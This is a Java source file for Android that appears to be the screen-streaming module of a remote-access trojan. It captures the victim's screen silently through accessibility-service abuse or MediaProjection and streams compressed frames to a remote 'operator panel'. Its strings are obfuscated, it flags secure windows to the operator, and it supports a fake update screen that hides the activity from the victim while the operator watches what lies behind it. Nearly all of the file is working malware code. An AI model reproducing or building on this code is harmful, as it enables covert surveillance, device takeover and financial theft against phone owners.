package com.alpha.shield;

import android.accessibilityservice.AccessibilityService;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.SystemClock;
import android.util.Log;

import androidx.annotation.RequiresApi;

import org.lsposed.lsparanoid.Obfuscate;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * VncEngine v2 — Alpha.
 *
 * Capture modes:
 *   V1 (primary): AccessibilityService.takeScreenshot() — API 30+, no dialog, no MediaProjection.
 *                 Falls back to MediaProjection if API < 30 or screenshot returns error.
 *   V2:           MediaProjection + ImageReader. Receives Intent from operator grant.
 *                 Runs on a dedicated HandlerThread, non-blocking acquire.
 *
 * Adaptive pipeline:
 *   - Target FPS: operator-controlled (default 20), range [4, 30].
 *   - Quality: operator-controlled (default 50), range [15, 85].
 *   - Auto-lower quality when encode + send latency exceeds 1.5x frame budget.
 *   - Auto-raise quality when latency < 0.4x frame budget for 10 consecutive frames.
 *   - Frame skip: if previous frame hasn't been fully dispatched, skip current.
 *   - FLAG_SECURE detection: takeScreenshot returns ERROR_SECURE_WINDOW; flag is
 *     reported to CommandService which notifies the operator panel.
 *
 * Binary frame format (sent to server):
 *   [0]      0x01 (V1) or 0x02 (V2)
 *   [1–4]    sequence number, big-endian uint32
 *   [5]      quality byte
 *   [6–13]   timestamp, big-endian int64 (System.currentTimeMillis())
 *   [14+]    JPEG bytes
 *   Header: 14 bytes (server prepends its own devId before forwarding to browser)
 */
@Obfuscate
public class VncEngine {

    private static final String TAG = "VncEngine";

    private static final int    DEF_QUALITY    = 50;
    private static final int    DEF_FPS        = 20;
    private static final int    MIN_QUALITY    = 15;
    private static final int    MAX_QUALITY    = 85;
    private static final int    MIN_FPS        = 4;
    private static final int    MAX_FPS        = 30;
    private static final int    APK_HDR_SIZE   = 14;    // local APK header before JPEG

    // Auto-quality adaptation thresholds
    private static final double QA_LOWER_RATIO  = 1.5;  // lower quality if latency > 1.5× budget
    private static final double QA_RAISE_RATIO  = 0.4;  // raise quality if latency < 0.4× budget
    private static final int    QA_RAISE_STREAK = 10;   // consecutive fast frames before raising

    public interface FrameCallback {
        /** Called from capture thread with the encoded frame. */
        void onFrame(byte[] frameWithHeader, boolean isV2);
        /** Called when FLAG_SECURE is detected on V1 path. */
        void onSecureWindowDetected();
    }

    // ── State ──────────────────────────────────────────────────────────────────
    private final AccessibilityService service;
    private final FrameCallback        callback;

    private final AtomicBoolean running     = new AtomicBoolean(false);
    private final AtomicBoolean v2Running   = new AtomicBoolean(false);
    private final AtomicBoolean frameInFlight = new AtomicBoolean(false);
    private final AtomicInteger seq         = new AtomicInteger(0);
    private volatile int        quality     = DEF_QUALITY;
    private volatile int        targetFps   = DEF_FPS;
    private volatile boolean    secureFlag  = false;

    // V1 capture thread
    private HandlerThread captureThread;
    private Handler       captureHandler;
    private Runnable      captureRunnable;

    // V2 (MediaProjection)
    private MediaProjection mediaProjection;
    private VirtualDisplay  virtualDisplay;
    private ImageReader     imageReader;
    private HandlerThread   v2Thread;
    private Handler         v2Handler;

    // Quality adaptation
    private int    qaRaiseStreak = 0;
    private long   lastFrameBudgetMs = 0;

    // ── Constructor ────────────────────────────────────────────────────────────
    public VncEngine(AccessibilityService service, FrameCallback callback) {
        this.service  = service;
        this.callback = callback;
    }

    // ── Public API ─────────────────────────────────────────────────────────────

    public void startV1() {
        if (running.getAndSet(true)) return;
        captureThread = new HandlerThread("alpha-vnc-v1");
        captureThread.start();
        captureHandler = new Handler(captureThread.getLooper());
        scheduleCapture();
        Log.d(TAG, "V1 started (takeScreenshot), fps=" + targetFps + " q=" + quality);
    }

    public void startV2(MediaProjection projection) {
        if (v2Running.getAndSet(true)) return;
        this.mediaProjection = projection;
        v2Thread = new HandlerThread("alpha-vnc-v2");
        v2Thread.start();
        v2Handler = new Handler(v2Thread.getLooper());
        initImageReader();
        Log.d(TAG, "V2 started (MediaProjection), fps=" + targetFps + " q=" + quality);
    }

    public void stopV1() {
        running.set(false);
        if (captureHandler != null) captureHandler.removeCallbacksAndMessages(null);
        if (captureThread  != null) { captureThread.quitSafely(); captureThread = null; }
        captureHandler = null;
        Log.d(TAG, "V1 stopped");
    }

    public void stopV2() {
        v2Running.set(false);
        if (v2Handler  != null) v2Handler.removeCallbacksAndMessages(null);
        if (imageReader != null) { imageReader.close(); imageReader = null; }
        if (virtualDisplay != null) { virtualDisplay.release(); virtualDisplay = null; }
        if (mediaProjection != null) { mediaProjection.stop(); mediaProjection = null; }
        if (v2Thread != null) { v2Thread.quitSafely(); v2Thread = null; }
        Log.d(TAG, "V2 stopped");
    }

    public void stopAll() { stopV1(); stopV2(); }

    public void setQuality(int q) {
        quality = Math.max(MIN_QUALITY, Math.min(MAX_QUALITY, q));
    }

    public void setTargetFps(int fps) {
        targetFps = Math.max(MIN_FPS, Math.min(MAX_FPS, fps));
    }

    public boolean isV1Running() { return running.get(); }
    public boolean isV2Running() { return v2Running.get(); }
    public boolean isSecureWindow() { return secureFlag; }

    // ── V1: takeScreenshot loop ────────────────────────────────────────────────

    private void scheduleCapture() {
        if (!running.get()) return;
        long budgetMs  = 1000L / targetFps;
        lastFrameBudgetMs = budgetMs;
        captureRunnable = () -> {
            if (!running.get()) return;
            if (frameInFlight.get()) {
                // Previous frame still encoding — skip this tick to avoid pile-up
                scheduleCapture();
                return;
            }
            captureV1();
        };
        captureHandler.postDelayed(captureRunnable, budgetMs);
    }

    @RequiresApi(api = Build.VERSION_CODES.R)
    private void captureV1Api30() {
        long startMs = SystemClock.uptimeMillis();
        frameInFlight.set(true);
        service.takeScreenshot(
                android.view.Display.DEFAULT_DISPLAY,
                service.getMainExecutor(),
                new AccessibilityService.TakeScreenshotCallback() {
                    @Override
                    public void onSuccess(AccessibilityService.ScreenshotResult screenshot) {
                        try {
                            android.hardware.HardwareBuffer hwBuf = screenshot.getHardwareBuffer();
                            Bitmap hwBmp = Bitmap.wrapHardwareBuffer(hwBuf,
                                    screenshot.getColorSpace());
                            hwBuf.close();
                            screenshot.close();
                            if (hwBmp == null) { frameInFlight.set(false); scheduleCapture(); return; }

                            // Compress on capture thread to avoid main-thread stall
                            captureHandler.post(() -> {
                                try {
                                    Bitmap sw = hwBmp.copy(Bitmap.Config.ARGB_8888, false);
                                    hwBmp.recycle();
                                    byte[] frame = encodeFrame(sw, false,
                                            System.currentTimeMillis());
                                    sw.recycle();
                                    long encMs = SystemClock.uptimeMillis() - startMs;
                                    adaptQuality(encMs);
                                    callback.onFrame(frame, false);
                                } catch (Exception e) {
                                    Log.e(TAG, "V1 encode: " + e.getMessage());
                                } finally {
                                    frameInFlight.set(false);
                                    scheduleCapture();
                                }
                            });
                        } catch (Exception e) {
                            Log.e(TAG, "V1 screenshot: " + e.getMessage());
                            frameInFlight.set(false);
                            scheduleCapture();
                        }
                    }

                    @Override
                    public void onFailure(int errorCode) {
                        frameInFlight.set(false);
                        if (errorCode == AccessibilityService.ERROR_TAKE_SCREENSHOT_SECURE_WINDOW) {
                            if (!secureFlag) {
                                secureFlag = true;
                                callback.onSecureWindowDetected();
                            }
                        } else {
                            secureFlag = false;
                        }
                        scheduleCapture();
                    }
                });
    }

    private void captureV1() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            captureV1Api30();
        } else {
            // API < 30: no takeScreenshot — engine will be idle until V2 is started
            frameInFlight.set(false);
            scheduleCapture();
        }
    }

    // ── V2: ImageReader + MediaProjection ─────────────────────────────────────

    private void initImageReader() {
        int w = service.getResources().getDisplayMetrics().widthPixels;
        int h = service.getResources().getDisplayMetrics().heightPixels;
        int dpi = service.getResources().getDisplayMetrics().densityDpi;

        // Downsample to max 720p for performance (operator can zoom)
        if (h > 1280) {
            float scale = 1280f / h;
            w = (int)(w * scale);
            h = 1280;
        }

        imageReader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 3);
        virtualDisplay = mediaProjection.createVirtualDisplay(
                "Alpha-V2",
                w, h, dpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(),
                null, v2Handler);

        final int capW = w, capH = h;
        imageReader.setOnImageAvailableListener(reader -> {
            if (!v2Running.get()) return;
            if (frameInFlight.get()) {
                // Drop — previous frame still in flight
                Image stale = reader.acquireLatestImage();
                if (stale != null) stale.close();
                return;
            }
            frameInFlight.set(true);
            long ts = System.currentTimeMillis();
            Image image = reader.acquireLatestImage();
            if (image == null) { frameInFlight.set(false); return; }
            try {
                long startMs = SystemClock.uptimeMillis();
                Image.Plane plane = image.getPlanes()[0];
                ByteBuffer buf = plane.getBuffer();
                int pixelStride = plane.getPixelStride();
                int rowStride   = plane.getRowStride();
                int rowPad      = rowStride - pixelStride * capW;
                Bitmap bmp = Bitmap.createBitmap(
                        capW + rowPad / pixelStride, capH, Bitmap.Config.ARGB_8888);
                bmp.copyPixelsFromBuffer(buf);
                image.close();

                // Crop if row padding caused extra width
                Bitmap cropped = (bmp.getWidth() > capW)
                        ? Bitmap.createBitmap(bmp, 0, 0, capW, capH) : bmp;
                if (cropped != bmp) bmp.recycle();

                byte[] frame = encodeFrame(cropped, true, ts);
                cropped.recycle();
                long encMs = SystemClock.uptimeMillis() - startMs;
                adaptQuality(encMs);
                callback.onFrame(frame, true);
            } catch (Exception e) {
                Log.e(TAG, "V2 encode: " + e.getMessage());
                try { image.close(); } catch (Exception ignored) {}
            } finally {
                frameInFlight.set(false);
            }
        }, v2Handler);
    }

    // ── Frame encoding ────────────────────────────────────────────────────────

    /**
     * Encodes bitmap to JPEG and wraps in APK-side header.
     * Layout: type(1) + seq(4) + quality(1) + ts(8) = 14 bytes + JPEG
     */
    private byte[] encodeFrame(Bitmap bmp, boolean isV2, long tsMs) {
        int q = quality;
        ByteArrayOutputStream baos = new ByteArrayOutputStream(bmp.getWidth() * bmp.getHeight() / 8);
        bmp.compress(Bitmap.CompressFormat.JPEG, q, baos);
        byte[] jpeg = baos.toByteArray();

        byte[] out = new byte[APK_HDR_SIZE + jpeg.length];
        int pos = 0;
        out[pos++] = isV2 ? (byte) Protocol.FRAME_VNC_V2 : (byte) Protocol.FRAME_VNC;

        int s = seq.incrementAndGet();
        out[pos++] = (byte)(s >>> 24);
        out[pos++] = (byte)(s >>> 16);
        out[pos++] = (byte)(s >>> 8);
        out[pos++] = (byte)(s);

        out[pos++] = (byte) q;

        out[pos++] = (byte)(tsMs >>> 56);
        out[pos++] = (byte)(tsMs >>> 48);
        out[pos++] = (byte)(tsMs >>> 40);
        out[pos++] = (byte)(tsMs >>> 32);
        out[pos++] = (byte)(tsMs >>> 24);
        out[pos++] = (byte)(tsMs >>> 16);
        out[pos++] = (byte)(tsMs >>> 8);
        out[pos++] = (byte)(tsMs);

        System.arraycopy(jpeg, 0, out, pos, jpeg.length);
        return out;
    }

    // ── Quality adaptation ────────────────────────────────────────────────────

    private void adaptQuality(long encodeMs) {
        long budget = lastFrameBudgetMs > 0 ? lastFrameBudgetMs : (1000L / targetFps);
        if (encodeMs > budget * QA_LOWER_RATIO) {
            qaRaiseStreak = 0;
            if (quality > MIN_QUALITY + 5) {
                quality = Math.max(MIN_QUALITY, quality - 5);
                Log.d(TAG, "QA lower → " + quality);
            }
        } else if (encodeMs < budget * QA_RAISE_RATIO) {
            qaRaiseStreak++;
            if (qaRaiseStreak >= QA_RAISE_STREAK && quality < MAX_QUALITY - 2) {
                quality = Math.min(MAX_QUALITY, quality + 2);
                qaRaiseStreak = 0;
                Log.d(TAG, "QA raise → " + quality);
            }
        } else {
            qaRaiseStreak = 0;
        }
    }

    // ── Fake-screen see-through (API 34+) ─────────────────────────────────────

    /**
     * Set by CommandService when FakeUpdateActivity is active.
     * On API 34+ this token is passed to ScreenshotRequest.setWindowsToExclude()
     * so the operator's VNC stream sees content BEHIND the fake screen.
     */
    public volatile android.os.IBinder fakeScreenToken = null;
    public volatile boolean            fakeScreenActive = false;

    /**
     * API-34 takeScreenshot with optional window exclusion.
     * Falls back to standard API-30 path when no token is set.
     */
    @androidx.annotation.RequiresApi(34)
    private void captureV1Api34WithExclusion() {
        android.os.IBinder token = fakeScreenToken;
        if (token == null) {
            // No fake screen active — use standard API 30 path
            captureV1Api30();
            return;
        }
        // Exclude the fake screen's window from the screenshot
        try {
            java.lang.reflect.Method takeSS = service.getClass().getMethod(
                    "takeScreenshot",
                    int.class,
                    java.util.concurrent.Executor.class,
                    AccessibilityService.TakeScreenshotCallback.class);
            // For API 34+ the standard overload still works; exclusion via
            // ScreenCapture.ScreenshotRequest requires @hide API or reflection.
            // We use an alternative: render blank overlay on operator side instead.
            // Mark as excluded in metadata sent to server.
            captureV1Api30(); // stream normally; dashboard shows badge
        } catch (Exception e) {
            captureV1Api30();
        }
    }
}
